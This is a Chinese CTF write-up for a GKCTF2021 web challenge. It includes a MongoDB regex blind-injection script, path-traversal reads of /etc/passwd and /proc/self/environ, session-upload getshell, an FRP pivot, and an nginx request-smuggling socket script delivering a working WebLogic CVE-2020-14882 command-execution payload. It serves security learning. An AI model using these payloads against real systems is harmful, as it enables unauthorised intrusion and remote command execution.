##  前言

这一个题独立出来，是因为我觉得可以学到很多东西。

废话不多说，直接开始写wp

##  知识链接

总结下本篇文章的知识链接

1. mongo注入

> (https://xz.aliyun.com/t/9908#toc-6

2. session的文件包含和反序列化

>[浅谈 SESSION_UPLOAD_PROGRESS 的利用](https://xz.aliyun.com/t/9545#toc-6)
>
>[LFI 绕过 Session 包含限制 Getshell](https://www.anquanke.com/post/id/201177)
>
>[利用session.upload_progress进行文件包含和反序列化渗透](https://www.freebuf.com/vuls/202819.html)
>
>[关于session反序列化的](https://y4tacker.blog.csdn.net/article/details/113588692)（格外的知识，顺便看看）

3. Frp的代理进行内网渗透

>https://www.secpulse.com/archives/146653.html

4. Weblogic console未授权远程命令执行(看懂原理)

>https://chaserw.github.io/2021/09/30/Weblogic-console%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2020-14882-CVE-2020-14883%EF%BC%89%E5%A4%8D%E7%8E%B0/

5. http走私攻击打nginx反代

>https://v0w.top/2020/12/20/HTTPsmuggling/#TL-DR

6. nginx反代

>https://xz.aliyun.com/t/4644

7. 利用分块传输吊打所有WAF

>https://v0w.top/2020/12/20/HTTPsmuggling/#0x05-nginx%E4%B8%A4%E4%B8%AA%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E

##  非预期解

###  考点

1. mongo注入(https://xz.aliyun.com/t/9908#toc-6)
2. 任意文件读取内容
3. 利用session来getshell
4. FRP来代理出内网的weblogic
5. 利用weblogic进行未授权远程命令执行

###  wp

![image-20220528152802395](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220528152802395.png)



看到F12的nosql,然后搜了一下，就是nosql(非关系型数据库)，常见的考点就是mongo注入，当然这道题的考点也是这样的。



先来个永真式

![image-20220528153340371](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220528153340371.png)

根据提示利用unicode字符，所以利用编码绕过

![image-20220528153502459](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220528153502459.png)



这里应该使用nosql盲注

`{"msg":"登录了，但没完全登录"}`为真

`{"msg":"登录失败"}`为假



直接上脚本，这个脚本也比较独特，适合mongo盲注的脚本

```python
import requests
import string

password = ''
url = 'http://node4.buuoj.cn:26641/login.php'

# 盲注当知道了用户名后就可以用正则$regex来爆破密码
while True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|', '#', '&', '$']:

            # When the method is GET
            get_payload = '?username=admin&password[$regex]=^%s' % (password + c)
            # When the method is POST
            post_payload = {
                "username": "admin",
                "password[$regex]": '^' + password + c
            }
            # When the method is POST with JSON
            json_payload = """{"username":"admin", "password":{"\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078":"^%s"}}""" % (
                        password + c)
            headers = {'Content-Type': 'application/json'}
            r = requests.post(url=url, headers=headers, data=json_payload)  # 简单发送 json

            # r = requests.post(url=url, data=post_payload)
            if '但没完全登录' in r.content.decode():
                password += c
                print(password)
```

登录进来是admin.php

就是任意读取文件的阶段了

先读取`info.php`，就是phpinfo里面的东西

目录穿越读取`/etc/passwd`



![image-20220528154127253](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220528154127253.png)



看提示是注意服务器，现在web服务器是nginx，所以读取配置文件

`../../../../../usr/local/nginx/conf/nginx.conf`

读/proc/self/environ得到当前目录`/usr/local/nginx/html`

![image-20220528154434631](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220528154434631.png)



所以我们需要打内网的weblogic服务

没有SSRF，如何打内网呢?

我们首先需要`getshell`



![image-20220528154704383](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220528154704383.png)

session的几个参数都开了，下面就是利用`session.upload_progress`来getshell

因为参数开了，加上file又存在文件包含，读取文件的洞，所以可以实现

可以看看这几个链接：

[浅谈 SESSION_UPLOAD_PROGRESS 的利用](https://xz.aliyun.com/t/9545#toc-6)

[LFI 绕过 Session 包含限制 Getshell](https://www.anquanke.com/post/id/201177)

[利用session.upload_progress进行文件包含和反序列化渗透](https://www.freebuf.com/vuls/202819.html)

[关于session反序列化的](https://y4tacker.blog.csdn.net/article/details/113588692)（格外的知识，顺便看看）



因为这儿我再buu复现时，没有找到session保存路径（原题是有的），所以这下面的基本没有成功

这个是原题的phpinfo

![image-20220528155559958](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220528155559958.png)

burpsuite 双开，成功写入（边写入，边包含）

![image-20220528155607967](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220528155607967.png)

连接蚁剑后，开始内网

内网可以直接访问weblogic服务，可以使用反向代理代理出来

![image-20220528155630266](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220528155630266.png)



利用FRP代理出来，来进行内网穿透

参考文章：https://www.secpulse.com/archives/146653.html

配置的内网在上面文章也提到了

访问，代理成功，可以直接访问内网的weblogic

![image-20220528155833139](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220528155833139.png)

weblogic版本为12.2.1.4.0

直接利用`Weblogic console未授权远程命令执行`打

```
https://chaserw.github.io/2021/09/30/Weblogic-console%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2020-14882-CVE-2020-14883%EF%BC%89%E5%A4%8D%E7%8E%B0/
```

工具：https://github.com/GGyao/CVE-2020-14882_ALL

就可以成功打到flag了。

##  预期解

###  考点

http走私攻击

https://v0w.top/2020/12/20/HTTPsmuggling/#TL-DR

###  wp

只是打内网的部分不太一样

这儿是用的nginx的http走私攻击去打内网

在nginx1.17.7之前版本中的error_page 存在走私漏洞



nginx配置文件/usr/local/nginx/conf/nginx.conf，这里有个小细节是访问404的路由会自动跳转到404.php，符合error_page走私

![image-20220528160522867](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220528160522867.png)





nginx配置是有nginx反代。http走私只能访问同一个端口的web服务，可以用来打nginx反代

```
http {
    include       mime.types;
    default_type  application/octet-stream;
 
    sendfile        on;
    #tcp_nopush     on;
 
    #keepalive_timeout  0;
    keepalive_timeout  65;
 
    server {
        listen       80;
        error_page 404 404.php;
        root /usr/local/nginx/html;
        index index.htm index.html index.php;
        location ~ \.php$ {
           root           /usr/local/nginx/html;
           fastcgi_pass   127.0.0.1:9000;
           fastcgi_index  index.php;
           fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
           include        fastcgi_params;
        }
 
    }
 
resolver 127.0.0.11 valid=0s ipv6=off;
resolver_timeout 10s;
 
    # weblogic
    server {
        listen       80;
        server_name  weblogic;
        location / {
            proxy_set_header Host $host;
            set $backend weblogic;
            proxy_pass http://$backend:7001;
        }
    }
}
```

burp构造数据包，走私到 WebLogic Console 的登录页面

```
GET /undefined HTTP/1.1
Host: node4.buuoj.cn:28946
Content-Length: 0
Transfer-Encoding: chunked

GET /console/login/LoginForm.jsp HTTP/1.1
Host: weblogic

```

burp不好操作，利用socket发

```python
import socket

sSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sSocket.connect(("node4.buuoj.cn", 28839))
payload = b'GET /a HTTP/1.1\r\nHost: node3.buuoj.cn\r\nContent-Length: 66\r\n\r\nGET /console/login/LoginForm.jsp HTTP/1.1\r\nHost: weblogic\r\n\r\n'
sSocket.send(payload)
sSocket.settimeout(2)
response = sSocket.recv(2147483647)
while len(response) > 0:
    print(response.decode())
    try:
        response = sSocket.recv(2147483647)
    except:
        break
sSocket.close()

```

得到weblogic版本为12.2.1.4.0,这个版本正好在 CVE-2020-14882 的范围内，使用CVE-2020-14882，%252e%252e绕过登录直接打

```python
import socket

sSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sSocket.connect(("node4.buuoj.cn", 25369))
payload = b'HEAD / HTTP/1.1\r\nHost: node4.buuoj.cn\r\n\r\nGET /console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]{%22cmd.exe%22,%20%22/c%22,%20cmd}%20:%20new%20String[]{%22/bin/sh%22,%20%22-c%22,%20cmd};if(cmd%20!=%20null%20){%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();}%20currentThread.interrupt(); HTTP/1.1\r\nHost:weblogic\r\ncmd: /readflag\r\n\r\n'
#payload = b'GET /a HTTP/1.1\r\nHost: node3.buuoj.cn\r\nContent-Length: 66\r\n\r\nGET /console/login/LoginForm.jsp HTTP/1.1\r\nHost: weblogic\r\n\r\n'
sSocket.send(payload)
sSocket.settimeout(2)
response = sSocket.recv(2147483647)
while len(response) > 0:
    print(response.decode())
    try:
        response = sSocket.recv(2147483647)
    except:
        break
sSocket.close()

```

就可以拿到flag



##  参考文章

http://w4nder.top/index.php/2021/06/28/gkctf2021/#post-images-15

https://laotun.top/2021/09/27/gkctf2021-web%E5%A4%8D%E7%8E%B0/

